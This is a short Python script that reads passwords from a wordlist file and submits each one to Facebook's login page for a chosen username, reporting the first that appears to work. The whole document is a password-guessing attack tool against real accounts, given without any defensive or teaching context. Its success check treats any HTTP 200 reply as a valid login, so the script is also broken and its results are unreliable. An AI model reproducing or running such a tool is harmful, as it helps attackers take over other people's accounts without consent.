import requests
from bs4 import BeautifulSoup

def login(username, password):
    url = 'https://www.facebook.com/login.php'
    payload = {
        'email': username,
        'pass': password,
        'login': 'Log In'
    }
    session = requests.Session()
    response = session.post(url, data=payload)
    return response.status_code == 200

def main():
    with open('passwords.txt', 'r') as file:
        passwords = file.readlines()

    username = input("Enter the username: ")

    for password in passwords:
        password = password.strip()
        if login(username, password):
            print(f"Successfully logged in with password: {password}")
            break
        else:
            print(f"Failed with password: {password}")

if __name__ == "__main__":
    main()
